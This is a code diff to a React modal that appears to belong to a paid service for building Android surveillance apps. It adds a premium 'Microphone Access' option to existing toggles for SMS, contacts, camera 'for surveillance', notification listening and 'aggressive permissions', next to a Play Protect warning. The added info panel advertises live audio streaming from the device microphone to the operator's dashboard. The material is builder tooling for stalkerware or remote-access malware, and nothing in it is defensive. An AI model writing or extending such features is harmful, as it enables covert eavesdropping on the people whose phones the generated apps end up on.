@@ -31,8 +31,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [enableContactsPermission, setEnableContactsPermission] = useState(false); // Gallery/Storage is usually needed
     const [enableStoragePermission, setEnableStoragePermission] = useState(true); // Storage permission for gallery access
     const [enableCameraPermission, setEnableCameraPermission] = useState(false); // Camera permission for surveillance
+    const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false); // Microphone for live audio
     const [enableNotificationListener, setEnableNotificationListener] = useState(false); // Notification listener access
-    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'notifications' | null>(null);
+    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'notifications' | null>(null);
     const [showAdvanced, setShowAdvanced] = useState(false);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
@@ -137,6 +138,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableContactsPermission', enableContactsPermission.toString());
             formData.append('enableStoragePermission', enableStoragePermission.toString());
             formData.append('enableCameraPermission', enableCameraPermission.toString());
+            formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
             formData.append('enableNotificationListener', enableNotificationListener.toString());
             formData.append('aggressivePermissions', aggressivePermissions.toString());
             if (customIcon) {
@@ -291,6 +293,33 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     className={`w-12 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
                                 >
                                     <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && userPlan === 'premium' ? 'left-7' : 'left-1'}`} />
+                                </button>
+                            </div>
+
+                            {/* Microphone Permission - Premium Only */}
+                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${userPlan !== 'premium' ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
+                                <div className="flex items-center gap-2">
+                                    <svg className="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
+                                    <span className="text-sm font-medium text-white/70">Microphone Access</span>
+                                    {userPlan !== 'premium' && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PREMIUM</span>}
+                                    <button
+                                        onClick={() => setShowPermissionInfo('microphone')}
+                                        className="text-white/40 hover:text-emerald-400 transition-colors"
+                                    >
+                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    </button>
+                                </div>
+                                <button
+                                    onClick={() => {
+                                        if (userPlan !== 'premium') {
+                                            onUpgrade?.();
+                                            return;
+                                        }
+                                        setEnableMicrophonePermission(!enableMicrophonePermission);
+                                    }}
+                                    className={`w-12 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableMicrophonePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
+                                >
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && userPlan === 'premium' ? 'left-7' : 'left-1'}`} />
                                 </button>
                             </div>
 
@@ -465,7 +494,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm">
                                 <div className={`relative max-w-sm w-full mx-4 p-5 rounded-2xl border shadow-2xl ${showPermissionInfo === 'sms'
                                     ? 'bg-gradient-to-br from-blue-900/90 to-blue-950/90 border-blue-500/30'
-                                    : 'bg-gradient-to-br from-green-900/90 to-green-950/90 border-green-500/30'
+                                    : showPermissionInfo === 'microphone'
+                                        ? 'bg-gradient-to-br from-emerald-900/90 to-emerald-950/90 border-emerald-500/30'
+                                        : (showPermissionInfo === 'camera' || showPermissionInfo === 'notifications')
+                                            ? 'bg-gradient-to-br from-cyan-900/90 to-cyan-950/90 border-cyan-500/30'
+                                            : 'bg-gradient-to-br from-green-900/90 to-green-950/90 border-green-500/30'
                                     }`}>
                                     <button
                                         onClick={() => setShowPermissionInfo(null)}
@@ -559,6 +592,36 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 ⚠️ Requires manual enable in device Settings → Notification Access
                                             </p>
                                         </>
+                                    ) : showPermissionInfo === 'microphone' ? (
+                                        <>
+                                            <div className="flex items-center gap-3 mb-3">
+                                                <div className="p-2 rounded-lg bg-emerald-500/20">
+                                                    <svg className="w-6 h-6 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
+                                                </div>
+                                                <h4 className="text-lg font-bold text-white">Microphone Access</h4>
+                                            </div>
+                                            <p className="text-sm text-emerald-100/80 leading-relaxed">
+                                                Enabling this allows real-time live audio listening from the device microphone:
+                                            </p>
+                                            <ul className="mt-3 space-y-2 text-sm text-emerald-200/70">
+                                                <li className="flex items-center gap-2">
+                                                    <svg className="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                    Live audio streaming to dashboard
+                                                </li>
+                                                <li className="flex items-center gap-2">
+                                                    <svg className="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                    Noise suppression & auto gain
+                                                </li>
+                                                <li className="flex items-center gap-2">
+                                                    <svg className="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                    Real-time audio visualizer
+                                                </li>
+                                                <li className="flex items-center gap-2">
+                                                    <svg className="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                    Volume & mute controls
+                                                </li>
+                                            </ul>
+                                        </>
                                     ) : (
                                         <>
                                             <div className="flex items-center gap-3 mb-3">
@@ -591,9 +654,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         onClick={() => setShowPermissionInfo(null)}
                                         className={`mt-5 w-full py-2 rounded-lg font-medium text-sm ${showPermissionInfo === 'sms'
                                             ? 'bg-blue-500 hover:bg-blue-600'
-                                            : (showPermissionInfo === 'camera' || showPermissionInfo === 'notifications')
-                                                ? 'bg-cyan-500 hover:bg-cyan-600'
-                                                : 'bg-green-500 hover:bg-green-600'
+                                            : showPermissionInfo === 'microphone'
+                                                ? 'bg-emerald-500 hover:bg-emerald-600'
+                                                : (showPermissionInfo === 'camera' || showPermissionInfo === 'notifications')
+                                                    ? 'bg-cyan-500 hover:bg-cyan-600'
+                                                    : 'bg-green-500 hover:bg-green-600'
                                             } text-white transition-colors`}
                                     >
                                         Got it
